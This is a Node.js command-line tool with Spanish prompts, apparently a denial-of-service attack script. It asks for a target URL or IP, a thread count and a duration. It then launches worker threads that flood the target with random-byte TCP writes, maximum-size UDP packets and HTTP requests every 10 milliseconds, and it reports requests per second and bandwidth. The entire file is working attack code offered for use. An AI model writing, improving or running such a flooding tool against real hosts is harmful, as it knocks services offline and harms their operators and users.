#!/usr/bin/env node
'use strict';

const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const net = require('net');
const dgram = require('dgram');
const crypto = require('crypto');
const readline = require('readline');
const chalk = require('chalk');
const dns = require('dns/promises');
const url = require('url');
const http = require('http');

class DDoSAttack {
    constructor() {
        this.stats = { total: 0, success: 0, failed: 0, bandwidth: 0 };
        this.workers = [];
        this.methods = ['TCP', 'UDP', 'HTTP'];
    }

    async start() {
        const target = await this.ask(chalk.green.bold('Objetivo (URL/IP): '));
        const { host, port } = await this.resolveTarget(target);
        const threads = await this.numberBetween(chalk.green.bold('Hilos (100-1000): '), 100, 1000);
        const duration = await this.numberBetween(chalk.green.bold('Duración (segundos): '), 10, 3600);

        this.startTime = Date.now();
        this.startAttack(host, port, threads);
        this.showStats();
        setTimeout(() => this.stop(), duration * 1000);
    }

    startAttack(target, port, threads) {
        const attack = this.selectAttack(target, port);
        
        for (let i = 0; i < threads; i++) {
            setImmediate(() => {
                const worker = new Worker(__filename, { 
                    workerData: { target, port, attack: attack.toString() }
                });
                
                worker.on('message', (msg) => {
                    this.stats.total += msg.total;
                    this.stats.success += msg.success;
                    this.stats.failed += msg.failed;
                    this.stats.bandwidth += msg.bandwidth;
                });
                
                this.workers.push(worker);
            });
        }
    }

    selectAttack(target, port) {
        return {
            TCP: () => {
                const socket = net.connect(port, target);
                socket.write(crypto.randomBytes(1024));
                socket.on('connect', () => parentPort.postMessage({ 
                    total: 1, success: 1, bandwidth: 1024 
                }));
                socket.on('error', () => parentPort.postMessage({ 
                    total: 1, failed: 1 
                }));
            },
            UDP: () => {
                const socket = dgram.createSocket('udp4');
                const payload = crypto.randomBytes(65507);
                socket.send(payload, port, target, () => {
                    parentPort.postMessage({ 
                        total: 1, success: 1, bandwidth: 65507 
                    });
                    socket.close();
                });
            },
            HTTP: () => {
                const req = http.get(`http://${target}:${port}`, () => {
                    parentPort.postMessage({ total: 1, success: 1 });
                }).on('error', () => {
                    parentPort.postMessage({ total: 1, failed: 1 });
                });
            }
        }[this.methods[Math.floor(Math.random() * this.methods.length)]];
    }

    showStats() {
        setInterval(() => {
            const elapsed = (Date.now() - this.startTime) / 1000;
            const rps = (this.stats.total / elapsed).toFixed(0);
            const bw = (this.stats.bandwidth / 1024 ** 3).toFixed(3);
            
            process.stdout.write(chalk.green.bold(
                `\r[${elapsed.toFixed(1)}s] ` +
                `Peticiones: ${this.stats.total} ` +
                `(Éxitos: ${this.stats.success} | Fallos: ${this.stats.failed}) ` +
                `RPS: ${rps} | BW: ${bw}GB`
            ));
        }, 1000);
    }

    async ask(question) {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        return new Promise(resolve => {
            rl.question(question, answer => {
                rl.close();
                resolve(answer);
            });
        });
    }

    async numberBetween(question, min, max) {
        let num;
        do num = parseInt(await this.ask(question)) || min;
        while (num < min || num > max);
        return num;
    }

    async resolveTarget(input) {
        try {
            const parsed = new url.URL(input.includes('://') ? input : `http://${input}`);
            const resolved = await dns.lookup(parsed.hostname);
            return { host: resolved.address, port: parsed.port || 80 };
        } catch {
            console.log(chalk.red.bold('\n¡Objetivo inválido!'));
            process.exit(1);
        }
    }

    stop() {
        this.workers.forEach(w => w.terminate());
        console.log(chalk.green.bold('\nAtaque detenido'));
        process.exit();
    }
}

if (!isMainThread) {
    const { target, port, attack } = workerData;
    const attackFn = eval(`(${attack})`);
    setInterval(attackFn, 10);
}

if (isMainThread) {
    new DDoSAttack().start();
}